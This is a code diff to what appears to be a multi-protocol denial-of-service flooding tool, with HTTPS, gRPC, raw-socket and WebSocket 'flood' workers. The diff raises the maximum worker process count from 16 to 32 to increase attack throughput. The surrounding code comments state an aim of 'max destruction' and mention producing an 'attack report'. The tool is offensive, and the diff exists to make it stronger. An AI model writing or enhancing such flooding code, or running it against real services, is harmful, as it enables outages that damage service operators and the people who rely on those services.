@@ -254,7 +254,7 @@ def _mp_https_flood(args_tuple):
 async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
     """HTTPS multiprocess worker."""
     host, port, path = parse_http(url)
-    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
@@ -562,7 +562,7 @@ def _mp_grpc_flood(args_tuple):
 async def grpc_mp_worker(name, url, stats, duration, stop, payload_size=1024):
     """gRPC multiprocess worker."""
     host, port, path = parse_http(url)
-    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
@@ -736,7 +736,7 @@ async def _wait_pool(pool, async_result, timeout):
 async def raw_worker(name, url, stats, duration, stop, payload_size=0):
     """Raw HTTP multiprocess worker: max RPS via raw socket."""
     host, port, path = parse_http(url)
-    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
@@ -839,7 +839,7 @@ def _mp_ws_flood(args_tuple):
 async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
     """WebSocket multiprocess worker."""
     host, port, path = parse_ws(url)
-    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
@@ -1465,7 +1465,7 @@ examples:
     ap.add_argument("--report", default=None, metavar="FILE",
         help="Generate HTML attack report to FILE")
     ap.add_argument("--threads", type=int, default=None,
-        help="Override connection count for UDP/QUIC (default: 1 per mode)")
+        help="Multiprocess count (default: auto, max 32)")
     args = ap.parse_args()
 
     # Auto mode: probe target + always include L4 for max destruction
@@ -1513,7 +1513,7 @@ examples:
     # UDP/QUIC: set process count from --threads
     global _UDP_NPROCS
     if args.threads:
-        _UDP_NPROCS[0] = max(1, min(16, args.threads))
+        _UDP_NPROCS[0] = max(1, min(32, args.threads))
     else:
         _UDP_NPROCS[0] = 4  # default: 4 processes
 
